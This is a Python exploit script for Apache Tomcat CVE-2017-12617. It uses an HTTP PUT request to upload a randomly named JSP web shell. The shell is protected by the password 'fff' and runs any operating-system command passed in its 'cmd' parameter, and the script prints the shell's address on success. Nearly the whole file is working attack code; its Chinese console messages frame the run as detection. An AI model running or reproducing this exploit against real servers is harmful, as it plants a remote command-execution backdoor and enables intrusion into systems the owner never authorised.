#!/usr/bin/python

import string
from random import *
import requests


'''
Usage:
    moon.py -u  tomcat http://127.0.0.1:8080
    shell: http://127.0.0.1:8080/201712615.jsp?pwd=fff&cmd=whoami
'''

def gen_shell():
    min_char = 4
    max_char = 12
    allchar = string.ascii_letters + string.digits
    shell_name = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return shell_name + ".jsp"

def construct_put(url, f):
    #print(url)
    evil = """<%
    if("fff".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
        }
        %>"""
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    req = requests.put(str(url) +'/'+ str(f) + "/", data=evil, headers=headers, verify=False)
    #print(req.status_code)
    if req.status_code == 201:
        #print("File Created ..")
        print('发现-Tomcat-CVE-2017-12617!!!')
        print('Shell地址:'+(str(url) +'/'+ str(f))+'?pwd=fff&cmd=whoami')
    else:
        print('未发现-Tomcat-CVE-2017-12617。')

def attack(URL):
    print('[+]开始检测-Tomcat-CVE-2017-12617。[+]')
    shell_name = gen_shell()
    #print(shell_name)
    try:
        construct_put(URL, shell_name)
    except:
         print('shell上传错误。')
    print('[+]检测结束-Tomcat-CVE-2017-12617。[+]')
    print('\n')


if __name__ == '__main__':
    attack()